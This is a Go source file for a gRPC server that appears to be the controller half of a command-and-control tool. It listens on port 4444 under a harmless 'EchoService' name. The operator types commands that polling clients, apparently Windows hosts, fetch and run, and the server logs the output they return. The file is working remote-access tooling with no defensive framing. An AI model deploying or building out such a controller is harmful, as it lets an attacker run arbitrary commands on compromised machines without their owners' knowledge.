package main

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"net"
	"os"
	"sync"

	"github.com/cardfaux/windows-connect/grpcapi"
	"google.golang.org/grpc"
)

type server struct {
	grpcapi.UnimplementedEchoServiceServer
	mu              sync.Mutex
	pendingCommand  string
}

func (s *server) ExecuteCommand(ctx context.Context, req *grpcapi.CommandRequest) (*grpcapi.CommandResponse, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if req.Command == "GET_COMMAND" {
		// Client is polling for a command
		if s.pendingCommand != "" {
			log.Printf("Sending command to client: %s", s.pendingCommand)
			cmd := s.pendingCommand
			s.pendingCommand = "" // Clear after sending
			return &grpcapi.CommandResponse{Output: cmd}, nil
		}
		return &grpcapi.CommandResponse{Output: ""}, nil
	}

	// If not "GET_COMMAND", treat it as command output sent from client
	log.Printf("Output from client:\n%s\n", req.Command)
	return &grpcapi.CommandResponse{Output: "Output received."}, nil
}

func main() {
	lis, err := net.Listen("tcp", ":4444")
	if err != nil {
		log.Fatalf("Failed to listen: %v", err)
	}

	s := grpc.NewServer()
	srv := &server{}
	grpcapi.RegisterEchoServiceServer(s, srv)

	// Optional: set a command from stdin
	go func() {
		scanner := bufio.NewScanner(os.Stdin)
		for {
			fmt.Print("Enter command to send to client: ")
			if scanner.Scan() {
				cmd := scanner.Text()
				srv.mu.Lock()
				srv.pendingCommand = cmd
				srv.mu.Unlock()
			}
		}
	}()

	fmt.Println("gRPC server is listening on port 4444...")
	if err := s.Serve(lis); err != nil {
		log.Fatalf("Failed to serve: %v", err)
	}
}